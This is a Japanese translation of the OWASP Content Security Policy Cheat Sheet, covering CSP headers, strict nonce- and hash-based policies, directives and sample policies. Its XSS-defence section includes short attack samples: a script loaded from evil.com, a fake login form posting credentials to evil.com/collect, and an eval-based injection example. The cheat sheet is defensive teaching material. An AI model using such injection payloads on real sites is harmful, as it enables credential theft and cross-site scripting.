# Content Security Policy チートシート 日本語訳

## Attribution

- Original: Content Security Policy Cheat Sheet
- Source: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- Copyright: Cheat Sheets Series Team
- License: Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)
- License URL: https://creativecommons.org/licenses/by-sa/4.0/
- Changes: Japanese translation added.
- Retrieved: 2026-05-21

## 日本語訳

# Content Security Policy チートシート

## はじめに

この記事では、Web アプリケーションのクライアント側に**多層防御 (defense in depth)** の考え方を組み込む方法を示します。サーバーから Content-Security-Policy (CSP) ヘッダーを注入することで、ブラウザは現在閲覧中のページへコンテンツを読み込む動的呼び出しからユーザーを保護できるようになります。

## コンテキスト

XSS (Cross-Site Scripting)、クリックジャッキング、クロスサイトリークの脆弱性が増えているため、より**多層防御**のセキュリティアプローチが求められます。

### XSS に対する防御

CSP は次の方法で XSS 攻撃を防御します。

#### 1. インラインスクリプトの制限

ページによるインラインスクリプトの実行を防ぐことで、次のような注入攻撃は機能しません。

```html
<script>document.body.innerHTML='defaced'</script>
```

#### 2. リモートスクリプトの制限

ページが任意のサーバーからスクリプトを読み込むことを防ぐことで、次のような注入攻撃は機能しません。

```html
<script src="https://evil.com/hacked.js"></script>
```

#### 3. 危険な JavaScript の制限

`eval` のようなテキストから JavaScript へ変換する関数の実行をページで防ぐことにより、Web サイトは次のような脆弱性から保護されます。

```javascript
// A Simple Calculator
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`The sum is: ${sum}`);
```

#### 4. フォーム送信の制限

Web サイト上の HTML フォームがデータを送信できる先を制限することで、フィッシングフォームの注入も機能しなくなります。

```html
<form method="POST" action="https://evil.com/collect">
<h3>Session expired! Please login again.</h3>
<label>Username</label>
<input type="text" name="username"/>

<label>Password</label>
<input type="password" name="pass"/>

<input type="Submit" value="Login"/>
</form>
```

#### 5. オブジェクトの制限

さらに、HTML の [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) タグを制限することで、攻撃者が悪意のある Flash、Java、その他のレガシー実行可能要素をページへ注入することもできなくなります。

### フレーミング攻撃に対する防御

クリックジャッキングや、ブラウザのサイドチャネル攻撃 (xs-leaks) の一部の亜種では、悪意のある Web サイトがターゲット Web サイトをフレーム内に読み込む必要があります。

歴史的にはこの目的で `X-Frame-Options` ヘッダーが使われてきましたが、これは CSP の `frame-ancestors` ディレクティブによって旧式化されています。

### 多層防御

強力な CSP は、さまざまな種類の脆弱性、特に XSS に対する有効な**第二の防御層**を提供します。CSP は Web アプリケーションが脆弱性を*含む*こと自体を防ぎませんが、攻撃者がそれらの脆弱性を悪用することを大幅に難しくできます。

ユーザー入力を一切受け付けない完全に静的な Web サイトであっても、CSP を使用して [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity) の使用を強制できます。これは、JavaScript ファイルをホストしているサードパーティサイトの一つ (分析スクリプトなど) が侵害された場合に、悪意のあるコードが Web サイトに読み込まれることを防ぐ助けになります。

とはいえ、XSS に対する唯一の防御機構として CSP に依存**すべきではありません**。それでも [Cross-Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) に記載されているような適切な開発プラクティスに従い、その上に追加のセキュリティ層として CSP をデプロイする必要があります。

## ポリシーの配信

Content Security Policy は、Web サイトへ三つの方法で配信できます。

### 1. Content-Security-Policy ヘッダー

Web サーバーから Content-Security-Policy HTTP レスポンスヘッダーを送信します。

```text
Content-Security-Policy: ...
```

ヘッダーを使用する方法が推奨であり、CSP の全機能セットをサポートします。インデックスページだけではなく、すべての HTTP レスポンスで送信してください。

これは W3C 仕様の標準ヘッダーです。Firefox 23+、Chrome 25+、Opera 19+ でサポートされています。

### 2. Content-Security-Policy-Report-Only ヘッダー

`Content-Security-Policy-Report-Only` を使用すると、強制されない CSP を配信できます。

```text
Content-Security-Policy-Report-Only: ...
```

それでも、違反レポートはコンソールに出力され、`report-to` および `report-uri` ディレクティブが使用されている場合は違反エンドポイントへ送信されます。

これも W3C 仕様の標準ヘッダーです。Firefox 23+、Chrome 25+、Opera 19+ でサポートされています。この場合、ポリシーは非ブロッキング ("fail open") であり、`report-uri` (またはより新しい `report-to`) ディレクティブで指定された URL にレポートが送信されます。これは CSP をブロッキングモード ("fail closed") で利用する前段階としてよく使われます。

ブラウザは、サイトが `Content-Security-Policy` と `Content-Security-Policy-Report-Only` の両方を同時に問題なく使用することを完全にサポートしています。このパターンは、たとえば厳格な `Report-Only` ポリシーを実行して多数の違反レポートを取得しつつ、正当なサイト機能を壊さないように、より緩い強制ポリシーを適用するために使えます。

### 3. Content-Security-Policy Meta タグ

たとえば、ヘッダーを制御できない CDN に HTML ファイルをデプロイしている場合など、Content-Security-Policy ヘッダーを使用できないことがあります。

この場合でも、次のように HTML マークアップ内で `http-equiv` meta タグを指定することで CSP を使用できます。

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

完全な XSS 防御を含め、ほぼすべてが引き続きサポートされます。ただし、[フレーミング保護](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)、[サンドボックス化](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)、または [CSP 違反ログ記録エンドポイント](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to) は使用できません。

### 警告

`X-Content-Security-Policy` や `X-WebKit-CSP` は**使用しないでください**。これらの実装は旧式であり (Firefox 23、Chrome 25 以降)、限定的で、一貫性がなく、非常にバグが多いものです。

## CSP の種類 (細粒度/許可リストベースまたは strict)

CSP を構築する元々の仕組みでは、HTML ページのコンテキストで許可されるコンテンツとソースを定義する許可リストを作成していました。

しかし、現在の主要なプラクティスは、よりデプロイしやすく、バイパスされにくいためより安全な "Strict" CSP を作成することです。

## Strict CSP

Strict CSP は、後述の細粒度な [Fetch ディレクティブ](#fetch-ディレクティブ)のうち限定された数のディレクティブを、次の二つの仕組みのいずれかと組み合わせることで作成できます。

- Nonce ベース
- Hash ベース

`strict-dynamic` ディレクティブは、Strict CSP を実装しやすくするために任意で使用することもできます。

以降のセクションではこれらの仕組みに関する基本的なガイダンスを示しますが、Strict CSP を作成するには、Google による詳細で体系的な手順に従うことを強く推奨します。

__[Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)](https://web.dev/strict-csp/)__

### Nonce ベース

Nonce は、HTTP レスポンスごとに生成し、Content-Security-Policy ヘッダーへ追加する、一回限り使用の一意なランダム値です。例を示します。

```javascript
const nonce = uuid.v4();
scriptSrc += ` 'nonce-${nonce}'`;
```

次に、この nonce をビューへ渡し (nonce を使用するには非静的 HTML が必要です)、次のような script タグをレンダリングします。

```html
<script nonce="<%= nonce %>">
    ...
</script>
```

#### 警告

すべての script タグを "script nonce=..." に置換するミドルウェアを作成**しないでください**。攻撃者が注入したスクリプトにも nonce が付与されてしまうためです。nonce を使用するには、実際の HTML テンプレートエンジンが必要です。

### Hash

インラインスクリプトが必要な場合、特定のスクリプトだけの実行を許可する別の選択肢として `script-src 'hash_algo-hash'` があります。

```text
Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
```

ハッシュを取得するには、Google Chrome 開発者ツールで次のような違反を確認します。

> ❌ 次の Content Security Policy ディレクティブに違反しているため、インラインスクリプトの実行が拒否されました: "..." 'unsafe-inline' キーワード、ハッシュ (__'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='__)、または nonce...

この [hash generator](https://report-uri.com/home/hash) も使用できます。これは hash を使用する優れた[例](https://csp.withgoogle.com/docs/faq.html#static-content)です。

#### 注記

Hash の使用はリスクのあるアプローチになり得ます。たとえばコード整形などにより script タグ内の*何か*が変更されると (空白であっても)、ハッシュが変わり、スクリプトはレンダリングされません。

### strict-dynamic

`strict-dynamic` ディレクティブは、hash または nonce のいずれかと組み合わせて Strict CSP の一部として使用できます。

正しい hash または nonce を持つスクリプトブロックが追加の DOM 要素を作成し、その内部で JS を実行する場合、`strict-dynamic` は、それぞれに nonce や hash を明示的に追加しなくても、それらの要素を信頼するようブラウザに伝えます。

`strict-dynamic` は CSP Level 3 の機能ですが、CSP Level 3 は一般的なモダンブラウザで非常に広くサポートされています。

詳細については、[strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage) を確認してください。

## 詳細な CSP ディレクティブ

開発者がポリシーの流れを細かく制御できるように、複数の種類のディレクティブが存在します。細かすぎる、または許可が広すぎる非 Strict ポリシーを作成すると、バイパスと保護の喪失につながる可能性が高い点に注意してください。

### Fetch ディレクティブ

Fetch ディレクティブは、信頼してリソースを読み込む場所をブラウザに伝えます。

ほとんどの fetch ディレクティブには、[W3C で指定されたフォールバックリスト](https://www.w3.org/TR/CSP3/#directive-fallback-list)があります。このリストにより、スクリプト、画像、ファイルなどのソースを細かく制御できます。

- `child-src` は、開発者がネストされたブラウジングコンテキストと worker 実行コンテキストを制御できるようにします。
- `connect-src` は、fetch リクエスト、XHR、EventSource、Beacon、WebSocket 接続を制御します。
- `font-src` は、フォントを読み込める URL を指定します。
- `img-src` は、画像を読み込める URL を指定します。
- `manifest-src` は、アプリケーションマニフェストを読み込める URL を指定します。
- `media-src` は、動画、音声、テキストトラックリソースを読み込める URL を指定します。
- `prefetch-src` は、リソースをプリフェッチできる URL を指定します。
- `object-src` は、プラグインを読み込める URL を指定します。
- `script-src` は、スクリプトを実行できる場所を指定します。これは他のスクリプト系ディレクティブのフォールバックディレクティブです。
    - `script-src-elem` は、スクリプトリクエストおよびスクリプトブロックの実行が発生できる場所を制御します。
    - `script-src-attr` は、イベントハンドラーの実行を制御します。
- `style-src` は、ドキュメントへスタイルを適用できる場所を制御します。これには `<link>` 要素、`@import` ルール、`Link` HTTP レスポンスヘッダーフィールドから発生するリクエストが含まれます。
    - `style-src-elem` は、インライン属性を除くスタイルを制御します。
    - `style-src-attr` は、style 属性を制御します。
- `default-src` は、他の fetch ディレクティブのフォールバックディレクティブです。指定されたディレクティブには継承はありませんが、指定されていないディレクティブは `default-src` の値へフォールバックします。

### Document ディレクティブ

Document ディレクティブは、ポリシーが適用されるドキュメントのプロパティについてブラウザに指示します。

- `base-uri` は、`<base>` 要素が使用できる URL を指定します。
- `plugin-types` は、ドキュメントへ読み込めるリソースの種類を制限します (*例:* `application/pdf`)。影響を受ける要素 `<embed>` と `<object>` には三つのルールが適用されます。
    - 要素はその type を明示的に宣言する必要があります。
    - 要素の type は宣言された type と一致する必要があります。
    - 要素のリソースは宣言された type と一致する必要があります。
- `sandbox` は、フォーム送信などページのアクションを制限します。
    - リクエストヘッダー `Content-Security-Policy` とともに使用された場合にのみ適用されます。
    - ディレクティブに値を指定しない場合、すべての sandbox 制限が有効になります。`Content-Security-Policy: sandbox;`
    - [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)

### Navigation ディレクティブ

Navigation ディレクティブは、ドキュメントがナビゲートできる場所、またはドキュメントを埋め込める場所についてブラウザに指示します。

- `form-action` は、フォームが送信できる URL を制限します。
- `frame-ancestors` は、要求されたリソースを `<frame>`、`<iframe>`、`<object>`、`<embed>`、または `<applet>` 要素内に埋め込める URL を制限します。
    - このディレクティブが `<meta>` タグで指定された場合、そのディレクティブは無視されます。
    - このディレクティブは `default-src` ディレクティブへフォールバックしません。
    - `X-Frame-Options` はこのディレクティブによって旧式化され、ユーザーエージェントから無視されます。

### Reporting ディレクティブ

Reporting ディレクティブは、防止された動作の違反を指定された場所へ配信します。これらのディレクティブは単独では意味を持たず、他のディレクティブに依存します。

- `report-to` (CSP Level 3。[Reporting API](https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API) とともに使用) は、**主要かつ現在の**レポート用ディレクティブです。JSON 形式のエンドポイントリストを含む `Reporting-Endpoints` (またはレガシーな `Report-To`) レスポンスヘッダーで定義されたグループ名を参照します。
    - [MDN report-to documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
- `report-uri` は、CSP Level 3 により `report-to` を優先して**非推奨**になっています。これはレポート送信先の URI を受け取ります。
    - 形式: `Content-Security-Policy: report-uri https://example.com/csp-reports`

後方互換性を確保するには、両方のディレクティブを併用してください。`report-to` をサポートするブラウザはそれを使用して `report-uri` を無視し、古いブラウザは `report-uri` へフォールバックします。レガシーブラウザのサポートが不要になったら、`report-uri` を削除できます。

### 特別なディレクティブソース

| 値 | 説明 |
| --- | --- |
| 'none' | どの URL にも一致しません。 |
| 'self' | 同じスキームとポート番号を持つオリジンサイトを指します。 |
| 'unsafe-inline' | インラインスクリプトまたはインラインスタイルの使用を許可します。 |
| 'unsafe-eval' | スクリプト内で eval の使用を許可します。 |

ディレクティブソースの動作をよりよく理解するには、[W3C のソースリスト](https://w3c.github.io/webappsec-csp/#framework-directive-source-list)を確認してください。

## CSP サンプルポリシー

### Strict ポリシー

Strict ポリシーの役割は、古典的な格納型 XSS、反射型 XSS、および一部の DOM XSS 攻撃から保護することであり、CSP を実装しようとするすべてのチームにとって最適な目標であるべきです。

前述のとおり、Google は Strict CSP を作成するための詳細で体系的な[手順](https://web.dev/strict-csp)を用意しています。

その手順に基づき、Strict ポリシーを適用するには次の二つのポリシーのいずれかを使用できます。

#### Nonce ベースの Strict ポリシー

```text
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

#### Hash ベースの Strict ポリシー

```text
Content-Security-Policy:
  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

### 基本的な非 Strict CSP ポリシー

このポリシーは、Strict ポリシーを作成できない場合に使用でき、クロスサイトフレーミングとクロスサイトフォーム送信を防止します。これは、すべてのデフォルトレベルのディレクティブについて、元のドメインからのリソースのみを許可し、インラインスクリプト/スタイルの実行を許可しません。

アプリケーションがこれらの制限下で機能する場合、攻撃対象領域は大幅に削減され、ほとんどのモダンブラウザで動作します。

最も基本的なポリシーは、次を前提としています。

- すべてのリソースがドキュメントと同じドメインでホストされている。
- スクリプトとスタイルリソースにインラインまたは eval がない。
- 他の Web サイトがその Web サイトをフレーム化する必要がない。
- 外部 Web サイトへのフォーム送信がない。

```text
Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
```

さらに強化するには、次を適用できます。

```text
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

このポリシーは、同一オリジンからの画像、スクリプト、AJAX、CSS を許可し、その他のリソース (例: object、frame、media など) の読み込みを許可しません。

### 安全でないリクエストのアップグレード

開発者が HTTP から HTTPS へ移行している場合、次のディレクティブにより、すべてのリクエストが HTTP へのフォールバックなしで HTTPS 経由で送信されるようになります。

```text
Content-Security-Policy: upgrade-insecure-requests;
```

### フレーミング攻撃の防止 (クリックジャッキング、クロスサイトリーク)

- コンテンツのすべてのフレーミングを防止するには、次を使用します。
    - `Content-Security-Policy: frame-ancestors 'none';`
- サイト自身を許可するには、次を使用します。
    - `Content-Security-Policy: frame-ancestors 'self';`
- 信頼済みドメインを許可するには、次を実行します。
    - `Content-Security-Policy: frame-ancestors trusted.com;`

### インラインコードのリファクタリング

`default-src` または `script-src*` ディレクティブが有効な場合、CSP はデフォルトで、HTML ソース内に配置された次のような JavaScript コードを無効にします。

```javascript
<script>
var foo = "314"
<script>
```

インラインコードは別の JavaScript ファイルに移動でき、ページ内のコードは次のようになります。

```javascript
<script src="app.js">
</script>
```

`app.js` には `var foo = "314"` コードを含めます。

インラインコードの制限は `inline event handlers` にも適用されるため、次の構造は CSP の下でブロックされます。

```html
<button id="button1" onclick="doSomething()">
```

これは `addEventListener` 呼び出しに置き換えるべきです。

```javascript
document.getElementById("button1").addEventListener('click', doSomething);
```

## References

- [Strict CSP](https://web.dev/strict-csp)
- [CSP Level 3 W3C](https://www.w3.org/TR/CSP3/)
- [Content-Security-Policy](https://content-security-policy.com/)
- [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [CSP Wikipedia](https://en.wikipedia.org/wiki/Content_Security_Policy)
- [CSP CheatSheet by Scott Helme](https://scotthelme.co.uk/csp-cheat-sheet/)
- [Breaking Bad CSP](https://www.slideshare.net/LukasWeichselbaum/breaking-bad-csp)
- [CSP A Successful Mess Between Hardening And Mitigation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)
- [Content Security Policy Guide on AppSec Monkey](https://www.appsecmonkey.com/blog/content-security-policy-header/)
- CSP Generator: [Chrome](https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc)/[Firefox](https://addons.mozilla.org/en-US/firefox/addon/csp-generator/)
- [CSP evaluator](https://csp-evaluator.withgoogle.com/)

## ASVS との対応

| ASVS 項目 | 関連内容 |
| --- | --- |
| V3.1 | CSP ヘッダー、strict CSP、nonce/hash、`strict-dynamic`、`frame-ancestors`、違反レポートによるクライアント側防御 |
| V3.2 | XSS、DOM XSS、クリックジャッキング、XS-Leaks に対する防御の多層化 |
